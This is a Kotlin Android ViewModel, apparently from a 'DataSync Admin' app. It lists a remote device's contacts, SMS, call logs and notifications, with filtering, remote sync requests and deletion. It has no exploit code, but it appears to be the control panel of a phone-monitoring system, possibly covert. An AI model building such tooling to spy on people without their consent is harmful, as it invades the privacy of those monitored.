package com.datasync.admin.ui.viewmodel

import android.util.Log
import androidx.lifecycle.SavedStateHandle
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.datasync.admin.data.local.SettingsManager
import com.datasync.admin.domain.repository.AdminRepository
import com.datasync.admin.model.*
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.launch
import javax.inject.Inject

sealed class DeviceDetailUiState {
    object Loading : DeviceDetailUiState()
    data class Success(val device: Device) : DeviceDetailUiState()
    data class Error(val message: String, val lastError: String = "") : DeviceDetailUiState()
}

sealed class TabUiState<out T> {
    object Loading : TabUiState<Nothing>()
    object Empty : TabUiState<Nothing>()
    data class Success<out T>(val data: List<T>) : TabUiState<T>()
    data class Error(val message: String) : TabUiState<Nothing>()
}

@HiltViewModel
class DeviceDetailViewModel @Inject constructor(
    private val repository: AdminRepository,
    private val settingsManager: SettingsManager,
    savedStateHandle: SavedStateHandle
) : ViewModel() {

    private val exceptionHandler = CoroutineExceptionHandler { _, throwable ->
        Log.e("DeviceDetailViewModel", "DETAIL_LISTENER_ERROR: Background error", throwable)
        _syncStatus.value = SyncStatus.Failed
    }

    val deviceId: String = android.net.Uri.decode(savedStateHandle.get<String>("deviceId") ?: "")

    private val _uiState = MutableStateFlow<DeviceDetailUiState>(DeviceDetailUiState.Loading)
    val uiState: StateFlow<DeviceDetailUiState> = _uiState.asStateFlow()

    private val _selectedApp = MutableStateFlow("All")
    val selectedApp: StateFlow<String> = _selectedApp.asStateFlow()

    private val _searchQuery = MutableStateFlow("")
    val searchQuery: StateFlow<String> = _searchQuery.asStateFlow()

    private val _smsFilter = MutableStateFlow(0) // 0: All, 1: Inbox, 2: Sent
    val smsFilter: StateFlow<Int> = _smsFilter.asStateFlow()

    private val _callFilter = MutableStateFlow(0) // 0: All, 1: Incoming, 2: Outgoing, 3: Missed
    val callFilter: StateFlow<Int> = _callFilter.asStateFlow()

    private val _syncStatus = MutableStateFlow<SyncStatus>(SyncStatus.Idle)
    val syncStatus: StateFlow<SyncStatus> = _syncStatus.asStateFlow()

    init {
        Log.d("DeviceDetailViewModel", "DETAIL_LISTENER_STARTED: deviceId=$deviceId")
        Log.d("DeviceDetailViewModel", "DETAIL_DEVICE_PATH: devices/$deviceId")

        loadDevice()
    }

    private fun loadDevice() {
        if (deviceId.isBlank()) {
            _uiState.value = DeviceDetailUiState.Error("Invalid device ID")
            return
        }

        viewModelScope.launch(exceptionHandler) {
            repository.getDevice(deviceId)
                .collect { device ->
                    if (device != null) {
                        Log.d("DeviceDetailViewModel", "DETAIL_DEVICE_FOUND: $deviceId")
                        val now = System.currentTimeMillis()
                        _syncStatus.value = when {
                            device.syncRequestedAt > device.lastSyncTime && (now - device.syncRequestedAt) < 60000 -> SyncStatus.Syncing
                            device.syncStatus.startsWith("Error") -> SyncStatus.Failed
                            device.syncStatus == "Synced" -> SyncStatus.Success
                            else -> SyncStatus.Idle
                        }
                        _uiState.value = DeviceDetailUiState.Success(device)
                    } else {
                        Log.d("DeviceDetailViewModel", "DETAIL_DEVICE_MISSING: $deviceId")
                        _uiState.value = DeviceDetailUiState.Error("Device not found")
                    }
                }
        }
    }

    val themeMode = settingsManager.themeMode.stateIn(
        viewModelScope,
        SharingStarted.WhileSubscribed(5000),
        "System"
    )

    fun setThemeMode(mode: String) {
        viewModelScope.launch {
            settingsManager.setThemeMode(mode)
        }
    }

    fun selectApp(appName: String) {
        _selectedApp.value = appName
    }

    fun setSearchQuery(query: String) {
        _searchQuery.value = query
    }

    fun setSmsFilter(filter: Int) {
        _smsFilter.value = filter
    }

    fun setCallFilter(filter: Int) {
        _callFilter.value = filter
    }

    fun requestSync() {
        if (deviceId.isBlank()) return
        viewModelScope.launch(exceptionHandler) {
            _syncStatus.value = SyncStatus.Syncing
            android.util.Log.d("Sync", "ADMIN_SYNC_REQUEST_SENT")
            repository.requestSync(deviceId)
        }
    }

    fun deleteItem(collection: String, itemId: String) {
        if (deviceId.isBlank()) return
        viewModelScope.launch(exceptionHandler) {
            repository.deleteItem(deviceId, collection, itemId)
        }
    }

    fun deleteAllVisible(collection: String, items: List<Any>) {
        if (deviceId.isBlank()) return
        viewModelScope.launch(exceptionHandler) {
            if (items.isEmpty()) return@launch
            repository.deleteAllItems(deviceId, collection)
        }
    }

    fun deleteDevice() {
        if (deviceId.isBlank()) return
        viewModelScope.launch(exceptionHandler) {
            repository.deleteDevice(deviceId)
        }
    }

    val contacts: StateFlow<TabUiState<Contact>> = if (deviceId.isBlank()) {
        MutableStateFlow(TabUiState.Empty).asStateFlow()
    } else {
        combine(
            repository.getContacts(deviceId)
                .onStart { Log.d("DeviceDetailViewModel", "CONTACTS_LISTENER_START") }
                .onEach { Log.d("DeviceDetailViewModel", "CONTACTS_LISTENER_COUNT: ${it.size}") },
            _searchQuery
        ) { contacts, query ->
            val filtered = contacts.filter { it.name.contains(query, true) || it.phone.contains(query) }
            if (filtered.isEmpty()) TabUiState.Empty else TabUiState.Success(filtered)
        }.catch { e ->
            Log.e("DeviceDetailViewModel", "DETAIL_LISTENER_ERROR: contacts", e)
            emit(TabUiState.Error(e.message ?: "Failed to load contacts"))
        }.stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), TabUiState.Loading)
    }

    val sms: StateFlow<TabUiState<SMS>> = if (deviceId.isBlank()) {
        MutableStateFlow(TabUiState.Empty).asStateFlow()
    } else {
        combine(
            repository.getSMS(deviceId)
                .onStart { Log.d("DeviceDetailViewModel", "SMS_LISTENER_START") }
                .onEach { Log.d("DeviceDetailViewModel", "SMS_LISTENER_COUNT: ${it.size}") },
            _searchQuery,
            _smsFilter
        ) { sms, query, filter ->
            val filtered = sms.filter {
                (it.address.contains(query, true) || it.body.contains(query, true)) &&
                        (filter == 0 || it.type == filter)
            }
            if (filtered.isEmpty()) TabUiState.Empty else TabUiState.Success(filtered)
        }.catch { e ->
            Log.e("DeviceDetailViewModel", "DETAIL_LISTENER_ERROR: sms", e)
            emit(TabUiState.Error(e.message ?: "Failed to load sms"))
        }.stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), TabUiState.Loading)
    }

    val callLogs: StateFlow<TabUiState<CallLog>> = if (deviceId.isBlank()) {
        MutableStateFlow(TabUiState.Empty).asStateFlow()
    } else {
        combine(
            repository.getCallLogs(deviceId)
                .onStart { Log.d("DeviceDetailViewModel", "CALLLOGS_LISTENER_START") }
                .onEach { Log.d("DeviceDetailViewModel", "CALLLOGS_LISTENER_COUNT: ${it.size}") },
            _searchQuery,
            _callFilter
        ) { calls, query, filter ->
            val filtered = calls.filter {
                (it.name.contains(query, true) || it.number.contains(query)) &&
                        (filter == 0 || it.type == filter)
            }
            if (filtered.isEmpty()) TabUiState.Empty else TabUiState.Success(filtered)
        }.catch { e ->
            Log.e("DeviceDetailViewModel", "DETAIL_LISTENER_ERROR: calllogs", e)
            emit(TabUiState.Error(e.message ?: "Failed to load calllogs"))
        }.stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), TabUiState.Loading)
    }

    val notifications: StateFlow<TabUiState<NotificationData>> = if (deviceId.isBlank()) {
        MutableStateFlow(TabUiState.Empty).asStateFlow()
    } else {
        combine(
            repository.getNotifications(deviceId)
                .onStart { Log.d("DeviceDetailViewModel", "NOTIFICATIONS_LISTENER_START") }
                .onEach { Log.d("DeviceDetailViewModel", "NOTIFICATIONS_LISTENER_COUNT: ${it.size}") },
            _searchQuery,
            _selectedApp
        ) { notifications, query, app ->
            val filtered = notifications.filter {
                (app == "All" || it.appName == app) &&
                        (it.appName.contains(query, true) || it.title.contains(query, true) || it.text.contains(query, true))
            }
            if (filtered.isEmpty()) TabUiState.Empty else TabUiState.Success(filtered)
        }.catch { e ->
            Log.e("DeviceDetailViewModel", "DETAIL_LISTENER_ERROR: notifications", e)
            emit(TabUiState.Error(e.message ?: "Failed to load notifications"))
        }.stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), TabUiState.Loading)
    }

    val appFilters: StateFlow<Map<String, Int>> = if (deviceId.isBlank()) {
        MutableStateFlow(mapOf("All" to 0)).asStateFlow()
    } else {
        repository.getNotifications(deviceId)
            .map { notifications ->
                val counts = notifications.groupBy { it.appName }.mapValues { it.value.size }
                mapOf("All" to notifications.size) + counts
            }
            .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), mapOf("All" to 0))
    }
}

sealed class SyncStatus {
    object Idle : SyncStatus()
    object Syncing : SyncStatus()
    object Success : SyncStatus()
    object Failed : SyncStatus()
    object Offline : SyncStatus()
}
